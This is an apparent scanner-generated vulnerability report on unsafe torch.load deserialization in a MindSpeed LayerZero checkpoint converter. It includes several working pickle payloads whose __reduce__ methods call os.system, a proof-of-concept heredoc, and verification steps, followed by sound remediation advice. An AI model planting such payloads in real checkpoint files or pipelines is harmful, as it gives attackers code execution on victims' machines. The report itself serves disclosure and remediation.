# Deserialization Vulnerability: Unsafe torch.load with Inadequate Filename Prefix Filter

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Vulnerability ID** | VULN-SEC-LZ-003 |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **CVE Reference** | CVE-2025-32434 (PyTorch torch.load) |
| **Severity** | High |
| **CVSS Score** | 7.8 (High) |
| **File** | mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py |
| **Line(s)** | 55, 110, 127, 135 |
| **Function** | LayerzeroCheckpoint class (multiple methods) |
| **Sink** | torch.load() without weights_only=True |

## Description

The `LayerzeroCheckpoint` class uses `torch.load()` to deserialize checkpoint files without the `weights_only=True` parameter. The only "mitigation" is a filename prefix check ("model_"), which provides **no security whatsoever**. An attacker who can write to the checkpoint directory can trivially bypass this check by naming their malicious file with the "model_" prefix.

### Vulnerable Code Analysis

**Entry Point** - Line 91-96:
```python
class LayerzeroCheckpoint(object):
    def __init__(self, ckpt_dir):
        self.ckpt_dir = ckpt_dir
        self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)  # MODEL_FILE_KEY = "model_"
        self.global_state = {}
        self._build_global_state()  # VULNERABLE: loads files from untrusted source
```

**Inadequate Mitigation** - Line 141-147:
```python
def _get_files_by_key(self, ckpt_dir, key):
    file_list = []
    for root, _, files in os.walk(ckpt_dir):
        for file in files:
            if file.startswith(key):  # ONLY checks filename prefix!
                file_list.append(os.path.join(root, file))
    return file_list
```

**Sink - Unsafe Deserialization** - Line 110:
```python
def _build_global_state(self):
    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))  # NO weights_only=True!
```

**Additional Vulnerable Sinks** - Line 55 (ShardStateDict class):
```python
def _init_metadata(self):
    state_dict = torch.load(self.filename, map_location='cpu')  # NO weights_only=True!
```

## Attack Vector Analysis

### Attack Scenario

1. **Attacker gains write access** to checkpoint directory (e.g., compromised model repository, malicious insider, supply chain attack)
2. **Attacker creates malicious checkpoint file** named `model_exploit.pt` with embedded pickle payload:
   ```python
   import torch
   import pickle
   
   class MaliciousPickle:
       def __reduce__(self):
           import os
           return (os.system, ('id > /tmp/pwned',))
   
   # Create malicious checkpoint
   malicious_data = {
       'iteration': 100,
       'args': type('Args', (), {'num_layers': 12, 'pipeline_model_parallel_size': 1})(),
       'parallel_state': {'tp_rank': 0, 'pp_rank': 0, 'global_rank': 0, 'tp_degree': 1, 'pp_degree': 1, 'dp_degree': 1},
       'shard_state_dict': {},
       'model': {}
   }
   torch.save(malicious_data, 'model_exploit.pt')
   ```
3. **Operator runs conversion tool**:
   ```bash
   python convert_to_megatron.py --input_folder ./checkpoints --output_folder ./output
   ```
4. **Malicious code executes** when `torch.load()` deserializes the file

### Why the Prefix Check Fails

| Assumed Protection | Reality |
|-------------------|---------|
| Only legitimate checkpoint files pass filter | Any file starting with "model_" passes |
| Attacker cannot predict filter | Filter is trivial to satisfy: `model_evil.pt` |
| Provides security boundary | Provides ZERO security - just a naming convention |

## Proof of Concept

```bash
# Attacker in checkpoint directory
cd /path/to/checkpoints/

# Create malicious checkpoint (passes "model_" prefix check)
python3 << 'EOF'
import torch

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('echo VULNERABLE > /tmp/pwned',))

payload = {
    'iteration': 0,
    'args': type('Args', (), {'num_layers': 1, 'pipeline_model_parallel_size': 1})(),
    'parallel_state': {'tp_rank': 0, 'pp_rank': 0, 'global_rank': 0, 
                        'tp_degree': 1, 'pp_degree': 1, 'dp_degree': 1},
    'shard_state_dict': {},
    'model': RCE()
}
torch.save(payload, 'model_malicious.pt')  # Passes prefix filter!
EOF

# When operator runs:
# python convert_to_megatron.py --input_folder /path/to/checkpoints --output_folder /output
# -> Code execution occurs
```

## Data Flow

```
User Input (--input_folder)
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│  LayerzeroCheckpoint.__init__(ckpt_dir)                 │
│  ├─ self._get_files_by_key(ckpt_dir, "model_")          │
│  │   └─ Files matching "model_*" → self.file_list       │
│  │      [NO SECURITY: Attacker controls filename!]      │
│  └─ self._build_global_state()                          │
│      └─ torch.load(self.file_list[0])                   │
│          └─ pickle.loads() → RCE                        │
└─────────────────────────────────────────────────────────┘
```

## Impact Assessment

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Complete - Attacker can read any file accessible to the process |
| **Integrity** | Complete - Attacker can modify any data accessible to the process |
| **Availability** | Complete - Attacker can crash the process or cause denial of service |
| **Scope** | Limited to contexts where attacker can write to checkpoint directories |

### Attack Prerequisites

1. Write access to checkpoint directory (or ability to supply malicious checkpoint files)
2. Victim executes `convert_to_megatron.py` or instantiates `LayerzeroCheckpoint` with compromised directory

### Common Attack Surfaces

- Compromised model repositories (HuggingFace, model zoos)
- Malicious insider with file system access
- Supply chain attacks on checkpoint files
- Shared filesystems in multi-tenant environments
- CI/CD pipelines that process external checkpoints

## Related Vulnerabilities

This file contains multiple similar vulnerabilities:

| Line | Method | Issue |
|------|--------|-------|
| 55 | `ShardStateDict._init_metadata` | Unsafe torch.load on `self.filename` |
| 110 | `LayerzeroCheckpoint._build_global_state` | Unsafe torch.load on `self.file_list[0]` |
| 127-128 | `LayerzeroCheckpoint.get_iteration` | Unsafe torch.load (references undefined `self.mp_rank_files`) |
| 135-136 | `LayerzeroCheckpoint.get_args` | Unsafe torch.load (references undefined `self.mp_rank_files`) |

See also: **VULN-SEC-LZ-002** (ShardStateDict._init_metadata in same file)

## Remediation

### Primary Fix: Use weights_only=True

```python
# BEFORE (Vulnerable)
sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))

# AFTER (Secure)
sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
```

**Note**: This requires checkpoint files to contain only tensor data. If checkpoints contain custom objects, they must be refactored.

### Secondary Fix: Add File Validation

```python
import hashlib

def _validate_checkpoint_file(self, filepath: str, expected_hash: str = None) -> bool:
    """Validate checkpoint file integrity."""
    if expected_hash:
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        if file_hash != expected_hash:
            raise ValueError(f"Checksum mismatch for {filepath}")
    return True

def _build_global_state(self):
    # Validate first file
    self._validate_checkpoint_file(self.file_list[0])
    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
    # ... rest of method
```

### Tertiary Fix: Use Safetensors Format

```python
from safetensors.torch import load_file

# Replace torch.load with safetensors (no pickle, no code execution)
sd = load_file(self.file_list[0])  # Safe deserialization
```

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CVE-2025-32434: PyTorch torch.load vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
- [PyTorch Security Advisory: torch.load weights_only](https://pytorch.org/docs/stable/generated/torch.load.html)
- [Project SECURITYNOTE.md](docs/zh/SECURITYNOTE.md) - Acknowledges CVE-2025-32434 risk
- [Similar VULN-SEC-LZ-002](scan-results/details/VULN-SEC-LZ-002.md) - Same file, ShardStateDict class

## Verification

To verify this vulnerability:

1. Create a malicious checkpoint file:
   ```bash
   python3 -c "
   import torch
   class POC:
       def __reduce__(self):
           return (__import__('os').system, ('echo VULN-SEC-LZ-003_CONFIRMED',))
   torch.save({'model': POC()}, 'model_poc.pt')"
   ```

2. Run the conversion tool:
   ```bash
   python -c "
   from mindspeed.core.distributed.layerzero.state.scripts.layerzero_checkpointer import LayerzeroCheckpoint
   LayerzeroCheckpoint('./')"
   ```

3. If "VULN-SEC-LZ-003_CONFIRMED" is printed, the vulnerability is confirmed.

---

**Status**: Confirmed Vulnerability  
**Discovered**: 2024  
**Last Updated**: 2024
